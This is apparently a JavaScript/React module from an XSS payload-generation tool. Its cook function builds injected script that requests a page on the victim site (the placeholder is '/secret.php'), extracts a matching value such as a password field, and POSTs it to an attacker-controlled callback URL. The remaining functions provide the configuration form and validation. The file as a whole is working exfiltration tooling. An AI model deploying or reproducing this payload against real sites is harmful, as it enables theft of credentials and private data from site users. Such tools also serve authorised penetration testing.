import React from 'react'
import RecipeTextField from '~/components/RecipeTextField'
import RecipeCheckBox from '~/components/RecipeCheckBox'

export function cook (instance, vars) {
  const callbackName = `${instance.id}_cb`
  const dataName = `${instance.id}_data`

  let dataSelection = `var ${dataName} = xhr.response`
  if (instance.pattern) {
    dataSelection = `var ${dataName} = xhr.response.match(new RegExp('${instance.pattern.replace(/'/g, "\\'")}'))[0]`
  }

  let callbackBody = `var ${callbackName} = function () { }`
  if (instance.waitForResponse) {
    callbackBody = `var ${callbackName} = function () { __XSS_CHEF_ENTRY_POINT__ }`
  }

  const payload = [
    `ajaxRequest('GET', '${instance.resource}', undefined, function (xhr) {`,
    dataSelection,
    callbackBody,
    `ajaxRequest('POST', '${instance.callbackUrl}', 'data=' + encodeURIComponent(${dataName}), ${callbackName})`,
    `})`,
    instance.waitForResponse ? '' : '__XSS_CHEF_ENTRY_POINT__'
  ].join('\n')

  return {
    payload: vars.payload.replace(/__XSS_CHEF_ENTRY_POINT__/g, payload)
  }
}

export function init () {
  return {
    callbackUrl: '',
    resource: '',
    waitForResponse: true
  }
}

export function render (instance, setRecipeProperty) {
  return (
    <div>
      <RecipeTextField
        bindTo="resource"
        instance={instance}
        label="Resource"
        placeholder="Example: /secret.php"
        setRecipeProperty={setRecipeProperty}
      />

      <RecipeTextField
        bindTo="pattern"
        instance={instance}
        label="Pattern to Match"
        placeholder='Example: password="[a-zA-z0-9]+?"'
        setRecipeProperty={setRecipeProperty}
      />

      <RecipeTextField
        bindTo="callbackUrl"
        instance={instance}
        label="Callback URL"
        placeholder="Example: http://your.domain.com/logData"
        setRecipeProperty={setRecipeProperty}
      />

      <RecipeCheckBox
        bindTo="waitForResponse"
        instance={instance}
        label="Halt next operation until response is received"
        setRecipeProperty={setRecipeProperty}
      />
    </div>
  )
}

export function validate (instance) {
  if (instance.callbackUrl === '') {
    return false
  }

  if (instance.resource === '') {
    return false
  }

  return true
}
